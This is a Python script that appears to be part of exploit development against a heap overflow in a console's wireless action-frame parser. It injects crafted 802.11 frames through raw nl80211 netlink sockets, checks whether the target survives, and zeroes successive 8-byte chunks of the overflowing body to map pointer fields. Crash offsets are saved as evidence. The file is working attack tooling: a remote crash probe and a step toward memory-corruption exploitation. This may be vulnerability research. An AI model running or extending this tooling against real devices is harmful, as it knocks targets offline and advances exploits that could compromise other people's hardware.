#!/usr/bin/env -S python3 -u
"""Pinpoint NULL-pointer crash in overflow region.

FINDING: 0x41 fill OK, but fake FR at body[0x100] crashes.
Fake FR header writes NULLs to body[0x108:0x118] (prev/next pointers).
Hypothesis: there's a pointer field that crashes on NULL deref.

This script zeroes individual 8-byte chunks across the overflow region
to find ALL sensitive pointer fields.
"""

import os
import struct
import socket
import time
import subprocess
import json
from pathlib import Path

_LDN_ROOT = Path(__file__).resolve().parent.parent.parent
IFACE = "wlp5s0"
SWITCH_MAC = bytes.fromhex("ecc40df3dcdb")
SRC_MAC = bytes.fromhex("227ccee0bd56")
FREQ = 2412
LP2P_HEADER = b"\x7f\x00\x22\xaa\x04\x01\x01\x01\x00\x00\x00\x00"
EVIDENCE_DIR = str(_LDN_ROOT / "evidence" / "action_frame_overflow")


def get_nl80211_family():
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 16)
    pid = os.getpid() + 100
    s.bind((pid, 0))
    name = b'nl80211\x00'
    nla_b = struct.pack('HH', 4 + len(name), 2) + name
    if len(nla_b) % 4:
        nla_b += b'\x00' * (4 - len(nla_b) % 4)
    p = struct.pack('BBH', 3, 1, 0) + nla_b
    s.sendto(struct.pack('IHHII', 16 + len(p), 0x10, 3, 1, pid) + p, (0, 0))
    data = s.recv(8192)
    s.close()
    off = 20
    nllen = struct.unpack_from('I', data, 0)[0]
    while off < nllen:
        nla_len, nla_type = struct.unpack_from('HH', data, off)
        if nla_type == 1:
            return struct.unpack_from('H', data, off + 4)[0]
        off += (nla_len + 3) & ~3
    raise RuntimeError("nl80211 family not found")


def nla(t, d):
    if isinstance(d, int):
        d = struct.pack('I', d)
    n = struct.pack('HH', 4 + len(d), t) + d
    if len(n) % 4:
        n += b'\x00' * (4 - len(n) % 4)
    return n


def send_frame(fam_id, ifindex, frame_bytes):
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 16)
    pid = os.getpid() + 500 + (hash(frame_bytes[:16]) & 0xFFFF)
    s.bind((pid, 0))
    s.settimeout(2.0)
    genlhdr = struct.pack('BBH', 59, 0, 0)
    nla_data = nla(3, ifindex) + nla(38, FREQ) + nla(51, frame_bytes)
    payload = genlhdr + nla_data
    nlhdr = struct.pack('IHHII', 16 + len(payload), fam_id, 1 | 4, 99999, pid)
    try:
        s.sendto(nlhdr + payload, (0, 0))
        resp = s.recv(16384)
        _, msg_type = struct.unpack_from('IH', resp, 0)
        if msg_type == 2:
            err = struct.unpack_from('i', resp, 16)[0]
            s.close()
            return err
        s.close()
        return 0
    except socket.timeout:
        s.close()
        return -110
    except Exception as e:
        s.close()
        return str(e)


def build_frame(body):
    frame = bytearray()
    frame += struct.pack('<H', 0x00D0)
    frame += b"\x00\x00"
    frame += SWITCH_MAC
    frame += SRC_MAC
    frame += SWITCH_MAC
    frame += struct.pack('<H', 0x0000)
    frame += LP2P_HEADER
    frame += body
    return bytes(frame)


def build_body_with_null_chunk(body_size, fill, null_offset, null_len=8):
    """Build body with fill byte everywhere, except NULL at one chunk."""
    body = bytearray(body_size)
    body[0x21] = 0x03
    struct.pack_into(">H", body, 0x22, body_size - 0x38)
    body[0x26] = 0x01
    body[0x27] = 0x01
    if body_size > 0x1DC:
        struct.pack_into(">H", body, 0x1DA, 0x0100)
    for i in range(0x5C, body_size):
        body[i] = fill
    for i in range(null_len):
        if null_offset + i < body_size:
            body[null_offset + i] = 0x00
    return bytes(body)


def check_alive():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect(('192.168.0.1', 80))
        s.sendall(b'GET / HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n')
        d = s.recv(512)
        s.close()
        return b'HTTP/' in d
    except Exception:
        return False


def wait_alive(timeout=60):
    start = time.time()
    while time.time() - start < timeout:
        if check_alive():
            return True
        time.sleep(2)
    return False


def test_body(fam_id, ifindex, body, frame_count=60, wait_s=5):
    if not check_alive():
        if not wait_alive(60):
            return None
    frame = build_frame(body)
    for i in range(frame_count):
        send_frame(fam_id, ifindex, frame)
        time.sleep(0.002)
    time.sleep(wait_s)
    a = check_alive()
    if not a:
        time.sleep(3)
        a = check_alive()
    return a


def main():
    ifindex = socket.if_nametoindex(IFACE)
    fam_id = get_nl80211_family()
    print(f"Interface: {IFACE}, nl80211 family: {fam_id}")

    if not check_alive():
        print("Switch not reachable. Waiting...")
        if not wait_alive(60):
            return
    print("Switch is alive.")

    results = {}

    # Step 0: Verify 0x41 fill is STILL safe on this heap layout
    print(f"\n{'='*65}")
    print("  BASELINE: Full 0x41 fill")
    print("="*65)

    body = bytearray(0x800)
    body[0x21] = 0x03
    struct.pack_into(">H", body, 0x22, 0x800 - 0x38)
    body[0x26] = 0x01
    body[0x27] = 0x01
    struct.pack_into(">H", body, 0x1DA, 0x0100)
    for i in range(0x5C, 0x800):
        body[i] = 0x41

    r = test_body(fam_id, ifindex, bytes(body))
    print(f"  0x41 fill: {'OK' if r else 'CRASH'}")
    if not r:
        print("  Heap layout changed! 0x41 fill now crashes.")
        print("  Waiting for recovery and trying zero fill...")
        time.sleep(15)
        wait_alive(60)

        # Try zero fill
        body2 = bytearray(0x800)
        body2[0x21] = 0x03
        struct.pack_into(">H", body2, 0x22, 0x800 - 0x38)
        body2[0x26] = 0x01
        body2[0x27] = 0x01
        struct.pack_into(">H", body2, 0x1DA, 0x0100)
        r2 = test_body(fam_id, ifindex, bytes(body2))
        print(f"  0x00 fill: {'OK' if r2 else 'CRASH'}")
        if not r2:
            print("  BOTH fills crash. Need to wait for clean restart.")
            time.sleep(30)
            wait_alive(60)
            # Try smaller overflow
            body3 = bytearray(0x200)
            body3[0x21] = 0x03
            struct.pack_into(">H", body3, 0x22, 0x200 - 0x38)
            body3[0x26] = 0x01
            body3[0x27] = 0x01
            r3 = test_body(fam_id, ifindex, bytes(body3))
            print(f"  Small body 0x200: {'OK' if r3 else 'CRASH'}")

    # Step 1: Scan for NULL-sensitive 8-byte chunks
    # Use 0x41 fill as base, zero one 8-byte chunk at a time
    print(f"\n{'='*65}")
    print("  NULL POINTER SCAN: zeroing one 8-byte chunk at a time")
    print("  Base fill: 0x41, body size: 0x800")
    print("  Scanning body offsets 0x60..0x7F8 (step 8)")
    print("="*65)

    crash_offsets = []
    consecutive_crashes = 0

    # Scan in 8-byte steps through overflow region
    for off in range(0x60, 0x7F8, 8):
        if consecutive_crashes >= 3:
            print(f"\n  3 consecutive crashes — heap layout changed, stopping scan.")
            break

        body = build_body_with_null_chunk(0x800, fill=0x41, null_offset=off, null_len=8)
        r = test_body(fam_id, ifindex, body)

        if r is None:
            print(f"  body[0x{off:03x}:0x{off+8:03x}]=NULL → UNREACHABLE")
            time.sleep(15)
            wait_alive(60)
            continue

        status = "OK" if r else "CRASH"
        parser_off = off + 0x5C
        print(f"  body[0x{off:03x}:0x{off+8:03x}]=NULL (parser+0x{parser_off:04x}) → {status}")

        results[f"0x{off:03x}"] = status
        if not r:
            crash_offsets.append(off)
            consecutive_crashes += 1
            time.sleep(15)
            wait_alive(60)
        else:
            consecutive_crashes = 0

    if crash_offsets:
        print(f"\n  CRASH OFFSETS (body): {[f'0x{o:03x}' for o in crash_offsets]}")
        print(f"  CRASH OFFSETS (parser): {[f'0x{o+0x5C:04x}' for o in crash_offsets]}")
    else:
        print(f"\n  No NULL-sensitive chunks found!")

    # Step 2: For each crash offset, narrow down to 4-byte or even 1-byte
    if crash_offsets and consecutive_crashes < 3:
        print(f"\n{'='*65}")
        print("  FINE-GRAINED PROBE: narrowing crash to exact bytes")
        print("="*65)

        for crash_off in crash_offsets[:3]:
            # Test upper 4 bytes vs lower 4 bytes
            for name, null_off, null_len in [
                ("lower 4B", crash_off, 4),
                ("upper 4B", crash_off + 4, 4),
            ]:
                body = build_body_with_null_chunk(0x800, fill=0x41,
                                                   null_offset=null_off, null_len=null_len)
                r = test_body(fam_id, ifindex, body)
                if r is None:
                    time.sleep(15)
                    wait_alive(60)
                    continue
                status = "OK" if r else "CRASH"
                print(f"  body[0x{null_off:03x}:0x{null_off+null_len:03x}] ({name}) → {status}")
                results[f"fine_0x{null_off:03x}_{null_len}B"] = status
                if not r:
                    time.sleep(15)
                    wait_alive(60)

    # Save
    outfile = os.path.join(EVIDENCE_DIR, "null_ptr_probe.json")
    with open(outfile, "w") as f:
        json.dump({
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ"),
            "crash_offsets_body": [f"0x{o:03x}" for o in crash_offsets],
            "crash_offsets_parser": [f"0x{o+0x5C:04x}" for o in crash_offsets],
            "results": results
        }, f, indent=2)
    print(f"\n  Results saved to {outfile}")


if __name__ == "__main__":
    main()
